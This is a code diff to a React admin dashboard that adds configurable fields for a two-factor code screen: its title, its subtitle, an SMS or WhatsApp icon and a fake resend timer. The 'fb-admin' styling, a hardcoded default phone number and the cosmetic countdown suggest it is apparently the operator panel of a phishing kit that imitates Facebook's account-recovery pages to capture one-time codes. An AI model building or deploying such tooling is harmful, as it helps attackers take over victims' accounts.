@@ -294,6 +294,10 @@ export default function AdminDashboard({ onExit }) {
       defaultPhone: '+251990039392',
       countdownTime: '(00:36)',
       cardDisplayFallback: 'email',
+      twoFactorTitle: 'Check your text messages',
+      twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
+      twoFactorTimer: '00:52',
+      twoFactorChannel: 'sms',
     };
   });
   const [recoverySavedNotice, setRecoverySavedNotice] = useState(false);
@@ -318,6 +322,10 @@ export default function AdminDashboard({ onExit }) {
       defaultPhone: '+251990039392',
       countdownTime: '(00:36)',
       cardDisplayFallback: 'email',
+      twoFactorTitle: 'Check your text messages',
+      twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
+      twoFactorTimer: '00:52',
+      twoFactorChannel: 'sms',
     };
     setRecoverySettings(defaults);
     try {
@@ -2989,6 +2997,70 @@ export default function AdminDashboard({ onExit }) {
                           />
                           <span><strong>User Entered Phone Number</strong></span>
                         </label>
+                      </div>
+                    </div>
+
+                    <div style={{ borderTop: '1px solid #E2E8F0', margin: '20px 0 16px 0', paddingTop: 16 }}>
+                      <h4 style={{ margin: '0 0 12px 0', fontSize: 14, fontWeight: 700, color: '#0F172A' }}>
+                        Two-Factor Authentication (2FA) Challenge Settings
+                      </h4>
+
+                      <div className="fb-admin-form-group" style={{ marginBottom: 14 }}>
+                        <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                          2FA Screen Title
+                        </label>
+                        <input
+                          type="text"
+                          className="fb-admin-input"
+                          value={recoverySettings.twoFactorTitle || 'Check your text messages'}
+                          onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorTitle: e.target.value })}
+                          placeholder="e.g. Check your text messages"
+                          style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
+                        />
+                      </div>
+
+                      <div className="fb-admin-form-group" style={{ marginBottom: 14 }}>
+                        <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                          2FA Screen Subtitle
+                        </label>
+                        <input
+                          type="text"
+                          className="fb-admin-input"
+                          value={recoverySettings.twoFactorSubtitle || 'Enter the code that we sent to your mobile number.'}
+                          onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorSubtitle: e.target.value })}
+                          placeholder="e.g. Enter the code that we sent to your mobile number."
+                          style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
+                        />
+                      </div>
+
+                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginBottom: 16 }}>
+                        <div className="fb-admin-form-group">
+                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                            2FA Channel Icon
+                          </label>
+                          <select
+                            className="fb-admin-input"
+                            value={recoverySettings.twoFactorChannel || 'sms'}
+                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorChannel: e.target.value })}
+                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
+                          >
+                            <option value="sms">Text / SMS Message</option>
+                            <option value="whatsapp">WhatsApp</option>
+                          </select>
+                        </div>
+                        <div className="fb-admin-form-group">
+                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
+                            Resend Timer (e.g. 00:52)
+                          </label>
+                          <input
+                            type="text"
+                            className="fb-admin-input"
+                            value={recoverySettings.twoFactorTimer || '00:52'}
+                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorTimer: e.target.value })}
+                            placeholder="00:52"
+                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
+                          />
+                        </div>
                       </div>
                     </div>
 
